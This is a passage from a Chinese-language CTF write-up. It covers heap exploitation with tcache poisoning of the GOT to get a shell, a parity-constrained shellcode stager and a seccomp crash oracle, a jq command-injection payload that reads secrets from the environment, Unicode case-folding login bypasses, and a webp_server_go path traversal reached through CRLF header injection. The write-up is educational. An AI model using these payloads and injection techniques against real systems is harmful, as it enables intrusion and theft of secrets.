    read(0,note_ARRAY_004060b0[iVar2].mem + (int)(char)local_16c,1);
}
```
这里漏洞非常细微，实际上就是最后读取时，把`local_16c`从`uint`强制转换为了`char`。这样就导致，当这个块（下面称为目标块）长度大于0x100时，我们实际上是写入`0~0x7f`和`-0x80~0x0`。与此同时，这个题的LIBC版本是2.31（Ubuntu20.04），保护上没有PIE，Partial RELRO。

这个下溢和上溢其实各自有功能，我们分开说：

#### 高地址溢出：Unsorted bin Consolidate + leak LIBC
因为一般的输入会截断字符串，所以这个写入到目标块`0x7f`偏移是我们泄露堆内容的唯一机会。为此，我们要在目标块`0x80`的位置布置LIBC地址，比如说`0x70`处放一个unsortedbin并释放掉。

考虑到tcache的长度上限是`0x410`，我们可以申请两个`0x420`后（再申请一个`0x10`分隔top chunk），先释放高地址chunk进入unsorted bin，然后释放低地址，触发consolidate两个`chunk`合并为一个`0x840`，但高地址chunk的那个unsorted bin地址仍然在原来位置上（应该是`0x430`处）。之后再申请堆块时，假如tcache没有就会从这个`0x840`里面切，我们只需要保证切走`0x3a0`大小的堆块后，再申请新堆块时，那个地址就会在`0x90`处，去掉chunk头刚好就是0x80。

#### 低地址溢出：Chunk Extend + Tcache Poisoning
当然，我们也要充分利用低地址的溢出，考虑到溢出范围有`0x80`那么大，除了自己的chunk头还能溢出0x70字节，我们可以考虑在目标块的低地址申请几个小的堆块（我用的是0x30, 0x20, 0x20），在溢出过程中修改其中最低的一个堆块的大小，使其与后面两个小堆块重叠，达成两个指针指向同一个内存的情况，便于UAF。注意修改chunk头后需要释放掉再申请回来（0x70大小），这样能重置程序里（而非ptmalloc）记录的大小字段，才能真正覆盖到后两个堆块。

之后的流程可以参考how2heap里的[tcache poisoning](https://github.com/shellphish/how2heap/blob/master/glibc_2.31/tcache_poisoning.c)，把两个`0x20`堆块释放后会进入tcache。如果把`next`字段改成GOT表，经历两次申请后tcache就会申请到GOT表位置的堆块。我们可以把GOT的free改成`system`，之后free掉包含`/bin/sh`的堆块就可以getshell。我比较喜欢把最开始那个分隔top chunk用的chunk写成`/bin/sh`，颇有狡兔死走狗烹的那种感觉。

`flag{learning_deflat_trick_to_defeat_ollvm}`

## pwn-shellcode
有趣但折磨的shellcode题。程序读入一段shellcode，会对shellcode做一个很离谱的检查，然后在seccomp沙箱里执行（只允许open和read）。可以分为两个阶段。

#### 1. bypass odd-even check
这个检查其实是最难的一部分。检查部分代码：
```c
  sVar1 = read(0,__buf,0x200);
  local_18 = 0;
  while( true ) {
    if ((int)sVar1 <= local_18) {
      (*__buf)();
      return 0;
    }
    if ((int)((char)__buf[local_18] % '\x02') != local_18 % 2) break;
    local_18 = local_18 + 1;
  }
```
也就是说：shellcode需要偶数字节是偶数，奇数字节是小于128的奇数（大于128会得到-1），这个限制导致我们根本没法好好写shellcode，不过经过调试，我们可以获知此时rax，rsi, 都指向shellcode起始位置（栈顶），rdi为0。

```c
 RAX  0x7fc8a7859000 ◂— xor byte ptr [rcx], dh /* 0x31303130; '0101' */
 RBX  0x0
 RCX  0x1
 RDX  0x0
 RDI  0x0
 RSI  0x7fc8a7859000 ◂— xor byte ptr [rcx], dh /* 0x31303130; '0101' */
 R8   0x55c0c9bb6b10 ◂— 0x55c595b7f7a6
 R9   0x55c0c9bb6b10 ◂— 0x55c595b7f7a6
 R10  0x1
 R11  0x246
 R12  0x7fff2b577cb8 —▸ 0x7fff2b578df7 ◂— './shellcode'
 R13  0x55c0c7c43313 ◂— endbr64
 R14  0x0
 R15  0x7fc8a785c040 (_rtld_global) —▸ 0x7fc8a785d2e0 —▸ 0x55c0c7c42000 ◂— 0x10102464c457f
 RBP  0x7fff2b577ba0 ◂— 0x1
*RSP  0x7fff2b577b88 —▸ 0x55c0c7c433d7 ◂— mov eax, 0
*RIP  0x7fc8a7859000 ◂— xor byte ptr [rcx], dh /* 0x31303130; '0101' */
```

所以我们第一阶段目标是重新调用一次read，以在没有限制的情况下导入新的shellcode。这需要：

- RAX=0
- RDX=非零值，最好大于0x100小于0x1000（防止越界写报SIGSEGV或者read不成功）
- 调用syscall

经过一些尝试，我们发现在一些汇编指令上进行微调（改变某些位的值）可能得到与原来语句功能类似的指令。主要的发现：

- 指令的第一个字节通常定义了操作类型（add, xor, sub等），第二个字节的最后一个hex会决定第一个被操作的寄存器。考虑到奇偶性，比如通常rax, rdx是偶数，rsi, rbx是奇数。后面的通常会是操作数。
- 常用于函数调用的寄存器，如rdi, rdx, rsi, rax等，其push/pop指令通常很短，只有一个字节，可以用来奇数组和偶数组寄存器交换数据，比如`50 5b`等效于`push rax; pop rbx`，就把栈地址交给`rbx`
- `80 43 0c 01`等效于`add BYTE PTR [rbx+0xc], 0x1`。这个是非常有用的gadget，可以将shellcode某个位于偶数位置的字节变为奇数（特别是这个数可以大于128）。印象中有一个类似的gadget`add DWORD PTR [rax+0xb], 0x2`可以把奇数位置的字节变为大于128的值，但是不如这个有用。
- 等效NOP指令：这个题里NOP指令用于填充调整奇偶位，起到重要的辅助作用。正常的`\x90`可以用于奇数位和奇数位。但对于刚刚五字节的gadget，我们需要一个连接偶字节和偶字节的gadget。一番遍历后，我找到了`xor BYTE PTR [r9], al` == `41 30 01`，因为R9在调试中是一个可写的地址，并且我们在这个阶段不会用到R9。
- 关于rdx的取值：我们注意到R11寄存器的值是`0x246`，非常合适。`push r11; pop rdx`==`41 53 5a`，除了第一个是奇数外都很完美，而我们此时已经获得了修改偶数位置字节位奇数的能力。
- 关于syscall：同理，syscall为`0f 05`，需要改掉第一个字节。
- 结尾的细节：首先`syscall`后需要是一个NOP（`90`），因为执行syscall的时候CPU已经取到了下一个指令，我们必须要保证这个指令合法，后面的就是read后的新shellcode了。其次，因为read输入的结尾会加一个换行`0a`，所以`90`后还要补一个任意合法奇数。

最终shellcode (考虑SMC修正后):
```c
   0:   50                      push   rax
   1:   5b                      pop    rbx
   2:   48 31 c0                xor    rax, rax
   5:   41 30 01                xor    BYTE PTR [r9], al
   8:   80 43 0c 01             add    BYTE PTR [rbx+0xc], 0x1
   c:   41 53                   push   r11
   e:   5a                      pop    rdx
   f:   41 30 01                xor    BYTE PTR [r9], al
  12:   80 43 16 01             add    BYTE PTR [rbx+0x16], 0x1
  16:   0f 05                   syscall 
  18:   90                      nop
```

#### 2. bypass seccomp
先用`seccomp-tools`导出沙箱规则：
```c
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x06 0xc000003e  if (A != ARCH_X86_64) goto 0008
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x03 0xffffffff  if (A != 0xffffffff) goto 0008
 0005: 0x15 0x01 0x00 0x00000000  if (A == read) goto 0007
 0006: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0008
 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0008: 0x06 0x00 0x00 0x00000000  return KILL
```

可以看到只能用open和read两个系统调用，我们没办法输出了。我们唯一的输出就是可以让程序crash。所以我们可以写一个简单的程序，判断第i个字符是不是我们的输入，如果是就crash，然后我们遍历ASCII字符直到找到让程序crash的那个字符，就能泄露出一个字节。实际操作中，我们的输入不能太快，否则会出现我们还没知道程序crash，就已经发送了好几个字符的情况。我的测试中，发送字符间隔为0.2秒时，程序crash的时间会稳定领先1个字符。

```c
// we already input "flag\0" at RSI, now we open it
mov rax, 2
mov r10, rsi
mov rdi, rsi
xor rsi, rsi
xor rdx, rdx
syscall
// read flag content
lea rsi, [r10 + 0x400]
mov rdi, rax
xor rax, rax
mov rdx, 0x100
syscall
// read i-th character into r8b
// we also want to crash directly if this is null-byte
mov r8b, byte ptr [r10 + {0x400 + i}]
cmp r8b, 0
jz end
// loop reading from stdin until equal
loop:
lea rsi, [r10 + 0x800]
mov rdi, 0
xor rax, rax
mov rdx, 0x1
syscall

mov r9b, byte ptr [r10 + 0x800]
cmp r8b, r9b
jnz loop
// crash
end:
hlt
```
`flag{practice_handwrite_shellcode}`

不太清楚已经在沙箱里的情况下，重新调用prctl或者seccomp相关函数能不能取消沙箱（我觉得应该不能，不然这沙箱不是没什么用了）

## rev - peertrace（未做出）
第一次见用ptrace的程序，这个题给了两个程序，peer用fork生成子进程，子进程调用`PTRACE_TRACEME`后execve了另一个程序puppet，然后执行。puppet逻辑很简单，就是读入一个字符串，和0x28进行xor后与字符串比较，但实际上peer会断点修改输入，所以还是比较复杂的。

因为`tracer`本身还是可以GDB调试的，所以我们可以知道什么时候`tracer`对`tracee`进行了修改（特征很明显，无非就是当某些寄存器满足某种条件是会做某种操作）。主要分为两个阶段，倒着说：

第二阶段发生在异或时，每个字符异或都会下个断点，和某个字符串的对应字符进行加减运算。这个比较好逆向，只是不知道异或和加减哪个前哪个后，可以都试试。

第一阶段则发生在刚输入之后，会对输入的0x30个字节每8个字节为单位进行一些对换和加减。这部分有段非常难看懂的汇编，直接把ghidra反编译器整不会了，所以这部分我逆向代码应该是写错了，没得到结果。现在想想这部分应该直接angr，这个难度的加密ANGR绝对是可以跑出来的，只是我有点懒得写了。
```c
001013c0 48 89 c2        MOV        RDX,uVar6[0]
001013c3 48 8d 45 c0     LEA        uVar6[0]=>local_48,[RBP + -0x40]
001013c7 48 89 10        MOV        qword ptr [uVar6[0]]=>local_48,RDX
001013ca 0f b6 45 c0     MOVZX      uVar6[0]=>local_48,byte ptr [RBP + -0x40]
001013ce 0f b6 c0        MOVZX      uVar6[0],uVar6[0]
001013d1 48 89 85        MOV        qword ptr [RBP + local_160],uVar6[0]
            a8 fe ff ff
001013d8 0f b6 45 c5     MOVZX      uVar6[0],byte ptr [RBP + local_48[5]]
001013dc 88 45 c0        MOV        byte ptr [RBP + local_48[0]],uVar6[0]
001013df 48 8b 85        MOV        uVar6[0],qword ptr [RBP + local_160]
            a8 fe ff ff
                        0,5 swap
001013e6 88 45 c5        MOV        byte ptr [RBP + local_48[5]],uVar6[0]
001013e9 0f b6 45 c1     MOVZX      uVar6[0],byte ptr [RBP + local_48[1]]
001013ed 0f b6 c0        MOVZX      uVar6[0],uVar6[0]
001013f0 48 89 85        MOV        qword ptr [RBP + local_158],uVar6[0]
            b0 fe ff ff
001013f7 0f b6 45 c7     MOVZX      uVar6[0],byte ptr [RBP + local_48[7]]
001013fb 88 45 c1        MOV        byte ptr [RBP + local_48[1]],uVar6[0]
001013fe 48 8b 85        MOV        uVar6[0],qword ptr [RBP + local_158]
            b0 fe ff ff
00101405 88 45 c7        MOV        byte ptr [RBP + local_48[7]],uVar6[0]
00101408 0f b6 45 c2     MOVZX      uVar6[0],byte ptr [RBP + local_48[2]]
0010140c 0f b6 c0        MOVZX      uVar6[0],uVar6[0]
0010140f 48 89 85        MOV        qword ptr [RBP + local_150],uVar6[0]
            b8 fe ff ff
00101416 0f b6 45 c6     MOVZX      uVar6[0],byte ptr [RBP + local_48[6]]
0010141a 88 45 c2        MOV        byte ptr [RBP + local_48[2]],uVar6[0]
0010141d 48 8b 85        MOV        uVar6[0],qword ptr [RBP + local_150]
            b8 fe ff ff
00101424 88 45 c6        MOV        byte ptr [RBP + local_48[6]],uVar6[0]
00101427 c7 85 84        MOV        dword ptr [RBP + local_184],0x0
            fe ff ff 
            00 00 00 00

```

## web - YAJF
看起来是web题，实际上是bash shell escape。

这个题前端界面给了一个可以prettify json的小程序，题干说明了是`jq`。网站的API非常简单粗暴，可以用json参数传一个json文件，然后可以用很多个`args`参数传`jq`的命令行参数。json文件本身估计会被写入文件，利用可能不大了；但命令行参数可是实打实会被传进shell里，并且以空格分隔，所以过滤不严十有八九会RCE。这里提个小细节，因为此题需要传多个相同key的dict，我们可以用werkzeug安装时附带的multidict模块。

经过测试，发现几个特征。

- args最大长度为5，除此外没发现WAF
- 输出必须是合法的JSON格式，否则不会返回

首先我们用`;`把命令截断。然后，因为题干给出flag在环境变量里，我们首先想到`env | grep flag`可以输出flag内容。但是我们需要把它弄成一个合法json。其实是要解决两件事：

- grep本身会多输出一个换行符，不过如果用`$()`包起来就没事了，`echo -n $( env | grep flag )`
- 补一个字符串头尾，这个简单：`echo -n [\";`，`echo -n \"];`

这样最终会输出：`["FLAG=flag{rC3_1S_5o_eEEe@sY_hHhhHHH}"]`，结束。不过感觉还是不够劲啊，如果FLAG里面来点引号括号啥的估计能更好玩一点（

## web - secrets
这个题我也很喜欢，虽然分了三个阶段，但后两个阶段其实都在讲一个事情：当`upper/lower`字符串转换遇到非标准字符集时会发生什么。

#### 1. 源码泄露
当然首先我就被一个登陆页面给拦住了，尝试了一些SQL注入自然没什么结果。不过这个页面有些很奇怪的点：

- 有一个selectbox可以设置主题，切换不同的CSS。不过这题设置主题的方式有点特别，会设置一个类似`assets=assets/css/pico.violet.min.css`的cookie，然后通过`/redirectCustomAsset`的endpoint获得CSS。
- 网站上有两个hint，一个是HTML的注释，有一堆乱码，可以用Base85解码，得到的是网站的目录结构。还有一个是网页端控制台会输出一个数字列表，可以看出是在`color-picker.js`开头用`console.log`硬编码输出的，很明显是些信息。一开始我没看出来，问了Claude才意识到这些数字里只包含0-7，所以用八进制解码，得到一句话：`Don't you think the color picker is weird?`

哎呀我当然知道这个CSS有点奇怪。一阵fuzz后我发现，把`assets`cookie设置为`assets/css/../css/pico.violet.min.css`时，能正常设置；但`assets/../css/pico.violet.min.css`，看来这个CSS是简单的前缀匹配，可以绕过的。通过之前Base85的目录结构，我们可以泄露所有的源码文件，正式进入第二阶段。

#### 2. Normal User login：Python Unicode .upper .lower degeneracy
我一开始在源码里找到了普通用户的明文登录账号密码还挺高兴，但发现登不进去。仔细一看才发现，这个密码验证算法好像有点特别：

```python
def isEqual(a, b):
    return a.lower() != b.lower() and a.upper() == b.upper()

if isEqual(username, "alice") and isEqual(password, "start2024"):
    session["logged_in"] = True
    session["role"] = "user"
    return redirect("/")
elif username == "admin" and password == os.urandom(128).hex():
    session["logged_in"] = True
    session["role"] = "admin"
    return redirect("/")
```
好家伙，小写不相等，大写相等？这个设计应该是本来为了方便其他拉丁语种用户使用大小写功能的，但是确实会造成一些意想不到的绕过现象的，听说过Javascript那边确实有用这种现象攻击的案例，没想到Python也有。
于是，简单写了个Python代码，遍历所有Unicode字符，看看哪些出现了这种情况

```python
def isEqual(a:str, b:str):
    return a.lower() != b.lower() and a.upper() == b.upper()

for c in range(0x10ffff):
    if any([isEqual(chr(c), al) for al in [chr(0x61 + i) for i in range(26)]]):
        print(c, chr(c), [al for al in [chr(0x61 + i) for i in range(26)] if isEqual(chr(c), al)][0])
'''
305 ı i
383 ſ s
'''
```
很神奇啊，不止有，还有两个，刚好用来bypass用户名和密码。关于前者，我还看到了[stackoverflow](https://stackoverflow.com/questions/19030948/python-utf-8-lowercase-turkish-specific-letter)有土耳其人吐槽为什么Python2.7的`tolower`不能返回土耳其文字中的`ı`。

#### 3. Admin User Login: SQL Unicode CI
第三阶段是登录之后，我们可以传入一个`type`URL参数，通过SQLAlchemy向服务器请求内容。我们的flag在名为`secrets`的行中，但如果前端flask会检查`type`在Python中lower或upper之后返回了`secrets`，就不会像数据库请求而是返回一个报错页面。这个报错页面长这样：`You are not admin. Only admin can view secre<u>ts</u>`，很讲究啊，用一个下划线把最后两个字母`ts`给标出来了。

源码给出了数据库的编码格式为`utf8mb4`, 还有一个排序规则（collation）为`utf8mb4_unicode_ci`。查了[MySQL的文档](https://dev.mysql.com/doc/refman/8.0/en/charset-unicode-sets.html)，其实`utf8mb4`就是最大四字节的UTF8，就是一般意义下的UTF8（和Python一样的）。而`_unicode_ci`则比较有趣，它主要是为了让其他语言的非标准字符在排序比较时能和相似的标准字符有相同的地位，比如：
```
Ä = A
Ö = O
Ü = U
```
但有个特别有意思的案例，就是一个特殊字符可能可以对应多个标准字符，比如：
```
ß = ss
```
与本题无关，不过如果不是`_unicode_ci`可能会扩展一些这样的规则，比如德语的`utf8mb4_german2_ci`排序规则下有这些规则：
```
Ä = Æ = AE
Ö = Œ = OE
Ü = UE
ß = ss
```
（想到一些国产软件里面，会把汉字按拼音和英文一起排序，是不是也是相同的原理呢？）

联想到刚才有个被划出来的提示，有没有什么字符等效于`ts`呢？我们可以去[Unicode官方](https://www.unicode.org/Public/UCA/4.0.0/allkeys-4.0.0.txt)的文件中找一找，结果真的有：
```
02A6  ; [.1002.0020.0004.02A6][.0FEA.0020.0004.02A6] # LATIN SMALL LETTER TS DIGRAPH; QQKN
```
在Python中，`chr(0x2a6)`会返回`ʦ`，确实看着像ts两个字符拼起来。这个字符可以成功达成在Python里是一个字符，但是在SQL是两个字符的奇景，于是我们传`?type=secreʦ`就能拿到flag了。

顺便一提，如果你在浏览器里用Ctrl+F搜索功能搜索`ʦ`这个字，你会发现所有`ts`也能被搜出来。这个现象大大冲击了我的认知：在数据库的世界里，或许`ʦ`和`ts`本就是同样的东西。

`flag{sTR1Ngs_WitH_tHE_s@mE_we1ghT_aRe_3QUAl_iN_my5q1}`

## web - picbed
最喜欢也花了最多精力，虽然很多精力其实和本题无关就是了。

这个题是在GO开源项目`webp_server_go`基础上包了一个Flask前端，可以上传图片并以webp格式返回。首先审计一下Flask源码

- 上传接口`/upload`，需要文件名的扩展名为字母或数字，然后以`f"pics/{os.urandom(8).hex()}.{ext}"`存储在服务器上。（工作目录为`/opt`）。这个random hash文件名防止了上传路径穿越。
- 获取图片接口`/pics/<filename>`，首先确保请求的文件存在于服务器上，然后会向后端的`webp_server_go`创建一个socket发送HTTP请求。我们可以带一个`Accept`请求头，Flask会对请求头进行`urlparse.unquote_plus`之后嵌入在对后台的请求里。但这个处理实际上很糟糕，因为我只要带上`%0D%0A`换行后请求头就不再是请求头了，我们可以把HTTP报文截断并发送任意内容，而服务器返回的只是最后一个HTTP报文的内容。这实际上达成了对后台`webp_server_go`的SSRF。
- `/flag.png`位于根目录，工作目录之外，所以读到它需要个目录穿越。

因为有SSRF，所以我们重点就在后面的webp_serverp_go上了，fuzzing过程中，虽然发现有些情况下会crash掉，用`%2e%2e`会让logger出现没有normalize掉的`..`，但总体没发现什么问题。

#### 正解：webp_server_go路径穿越 （CVE-2021-46104，plus）
设定上这是一个0.4.0版本发现，现已经被修复的CVE，[相关issue有讨论](https://github.com/webp-sh/webp_server_go/issues/92)。最早版本似乎最简单粗暴的`%2e%2e%2f`就能穿，后来修了一些补丁，加入了`path.Clean`这样的处理，所以已经打不通了。

但这次发现，在HTTP报文中如果省略了开头的`/`，比如请求`GET ../../flag.png HTTP/1.1`，就会一路穿到根目录去。这个问题应该在`gofiber`库里，对URL的处理有逻辑问题。

这个的根源应该在于golang`path.Clean`处理原则[第四条](https://cs.opensource.google/go/go/+/refs/tags/go1.22.2:src/path/path.go;l=61)：如果HTTP报文中带`/`时，这个路径就相当于一个根目录，而根目录后的`..`会被自动清除。而如果不带`/`，`path.Clean`会认为这个是相对路径。
```go
// Clean returns the shortest path name equivalent to path
// by purely lexical processing. It applies the following rules
// iteratively until no further processing can be done:
//
//  1. Replace multiple slashes with a single slash.
//  2. Eliminate each . path name element (the current directory).
//  3. Eliminate each inner .. path name element (the parent directory)
//     along with the non-.. element that precedes it.
//  4. Eliminate .. elements that begin a rooted path:
//     that is, replace "/.." by "/" at the beginning of a path.
//
// The returned path ends in a slash only if it is the root "/".
//
// If the result of this process is an empty string, Clean
// returns the string ".".
//
// See also Rob Pike, “Lexical File Names in Plan 9 or
// Getting Dot-Dot Right,”
// https://9p.io/sys/doc/lexnames.html
func Clean(path string) string {
```
同时，gofiber的`path.go`也完全匹配了`/*`，即使它不以`/`开头：
```go
// RoutePatternMatch checks if a given path matches a Fiber route pattern.
func RoutePatternMatch(path, pattern string, cfg ...Config) bool {
	// See logic in (*Route).match and (*App).register
	var ctxParams [maxParams]string

	config := Config{}
	if len(cfg) > 0 {
		config = cfg[0]
	}

	if path == "" {
		path = "/"
	}

	// Cannot have an empty pattern
	if pattern == "" {
		pattern = "/"
	}
	// Pattern always start with a '/'
	if pattern[0] != '/' {
		pattern = "/" + pattern
	}

	patternPretty := pattern

	// Case-sensitive routing, all to lowercase
	if !config.CaseSensitive {
		patternPretty = utils.ToLower(patternPretty)
		path = utils.ToLower(path)
	}
	// Strict routing, remove trailing slashes
	if !config.StrictRouting && len(patternPretty) > 1 {
		patternPretty = strings.TrimRight(patternPretty, "/")
	}

	parser := parseRoute(patternPretty)

	if patternPretty == "/" && path == "/" {
		return true
		// '*' wildcard matches any path
	} else if patternPretty == "/*" {
		return true
	}

	// Does this route have parameters
	if len(parser.params) > 0 {
		if match := parser.getMatch(path, path, &ctxParams, false); match {
			return true
		}
	}
	// Check for a simple match
	patternPretty = RemoveEscapeChar(patternPretty)
	if len(patternPretty) == len(path) && patternPretty == path {
		return true
	}
	// No match
	return false
}
```
这两点一结合，就导致实际上`Clean`根本没有把开头的`../`去掉，就传给读取文件的函数了。很难评，`Clean`觉得自己得兼容文件系统，万一用户传的就是相对路径呢。`gofiber`觉得自己得尊重用户意愿不要乱改请求头，因为自己host的不一定是文件系统，万一各个endpoint有各自功能呢，怎么能乱改。然后`webp_server_go`觉得你们两位大哥肯定把事情都办好了啊，都`/*`了前面怎么会没有`/`呢，根据文档第四条`path.Clean`那不就是直接给去掉了吗。结果就谁都没管。

遥想当时打USTC Hackergame2023的那道iptables题，那个题的Go服务器就很严格，HTTP报文就必须得以`/`开头，不然就报500。看来这个处理是有道理的啊。

#### 失败的尝试：librsvg路径穿越（CVE-2023-38633，环境版本已修复）
为什么会考虑这个，是因为我偶然发现，好像环境的`librsvg`有点旧啊？
```sh
$ find /lib -name librsvg*
/lib/x86_64-linux-gnu/librsvg.2.48.0
```

> 然而事实上文件名的版本号是不对的。真正看版本最好的方式是`apt list|grep librsvg`，可以看到是`2.54.7`，是一个被作者把补丁backport回来的版本。

而刚好2.56.3版本有个SVG路径穿越[CVE-2023-38633](https://www.canva.dev/blog/engineering/when-url-parsers-disagree-cve-2023-38633/)。原本SVG要引用外部内容，librsvg会利用Rust的`std::fs::canonicalize`检查被引用的内容是否在SVG本身的父目录中。原本这个过程会把软连接、`../`这种给去掉，但这个`canonicalize`似乎原本不是处理Unix文件系统而是处理URL的（虽然`file://`也算一种URL，但最终是要调用Unix文件系统），这个过程中会把`?, #`部分给截掉，但是最后读取文件时用的又是原本的URL，这就导致了类似`.?../../../`这个东西，在`canonicalize`里相当于个`.`，自然属于当前目录，但在文件系统里相当于`.?..`相当于一级路径，并且会和后面一个`../`中和掉，后面的部分都会被拼接到路径里，造成路径穿越。解决方案就是不允许在SVG的URL中包含任何`?, #, @`等符号，同时传给文件系统的也必须是`canonicalize`后的路径。

当然`xi:include`和`image`标签，有理由相信他们检查URL的方法是一样的，一个能打，另一个也能。当然，做这个题的时候都打不通就是了。

在调试这个题的过程，我第一次使用strace去看系统调用，看文件读取细节，虽然没实质性作用，但还是让我稍微理解了一点librsvg的工作流程。